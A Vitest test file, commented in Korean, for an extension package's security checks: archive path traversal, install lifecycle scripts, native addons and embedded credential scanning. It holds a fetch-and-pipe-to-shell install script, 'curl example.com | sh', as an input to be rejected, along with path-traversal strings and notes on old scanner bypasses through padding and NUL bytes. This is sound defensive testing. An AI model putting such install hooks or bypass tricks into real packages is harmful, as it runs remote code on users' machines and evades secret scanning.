import { describe, expect, it } from "vitest";

import { assertNoEmbeddedCredential, assertSafeArchivePath, validatePackageSecurity } from "./security.js";
import { validPackage } from "./test-helpers.js";

describe("Extension package security", () => {
  it.each([
    "package/../escape",
    "../package/file",
    "/package/file",
    "C:\\package\\file",
    "package\\file",
    "package//file",
    "package/./file",
    "package/__proto__/file",
  ])("위험 archive path를 거부한다: %s", (path) => {
    expect(() => assertSafeArchivePath(path)).toThrow("path");
  });

  it("npm package lifecycle script·native addon·외부 dependency를 거부한다", () => {
    expect(() => validatePackageSecurity({ ...validPackage, scripts: { install: "curl example.com | sh" } })).toThrow(
      "lifecycle",
    );
    expect(() => validatePackageSecurity({ ...validPackage, gypfile: true })).toThrow("native");
    expect(() => validatePackageSecurity({ ...validPackage, dependencies: { leftpad: "1.0.0" } })).toThrow(
      "self-contained",
    );
  });

  describe("credential 스캔", () => {
    const SECRET = "AUTHORIZATION=Bearer abcdefghijklmnopqrstuvwxyz";

    it("평문 credential을 원문 노출 없이 거부한다", () => {
      expect(() => {
        assertNoEmbeddedCredential("package/.env", Buffer.from(SECRET, "utf8"));
      }).toThrow("credential");
      expect(() => {
        assertNoEmbeddedCredential("package/.env", Buffer.from(SECRET, "utf8"));
      }).not.toThrow(SECRET);
    });

    it("1MiB를 넘겨도 검사를 건너뛰지 않는다", () => {
      // 예전에는 `body.length > 1MiB`면 그대로 통과시켰습니다. 보안 검사를 크기로 끄면
      // 그 크기가 곧 우회 방법이 됩니다 — padding을 채우는 것만으로 스캔이 꺼졌습니다.
      const padded = Buffer.concat([Buffer.alloc(1024 * 1024 + 1, 0x61), Buffer.from(`\n${SECRET}`, "utf8")]);
      expect(padded.length).toBeGreaterThan(1024 * 1024);
      expect(() => {
        assertNoEmbeddedCredential("package/big.env", padded);
      }).toThrow("credential");
    });

    it("뒤쪽에 끼워 넣은 NUL로는 binary 판정을 유도하지 못한다", () => {
      // binary 판정을 파일 전체에서 하면 NUL 한 바이트로 검사를 끌 수 있습니다.
      // git과 같은 관례로 앞 8,000바이트만 봅니다.
      const body = Buffer.concat([Buffer.from(`${SECRET}\n`, "utf8"), Buffer.alloc(9_000, 0x61), Buffer.from([0])]);
      expect(() => {
        assertNoEmbeddedCredential("package/late-nul.env", body);
      }).toThrow("credential");
    });

    it("앞부분이 NUL인 진짜 binary는 검사하지 않는다", () => {
      // 판정을 좁힌 결과가 「모든 파일을 텍스트로 본다」가 되면 binary마다 헛되이 정규식을 돌립니다.
      const binary = Buffer.concat([Buffer.from([0, 1, 2]), Buffer.from(SECRET, "utf8")]);
      expect(() => {
        assertNoEmbeddedCredential("package/dist/blob.bin", binary);
      }).not.toThrow();
    });
  });
});
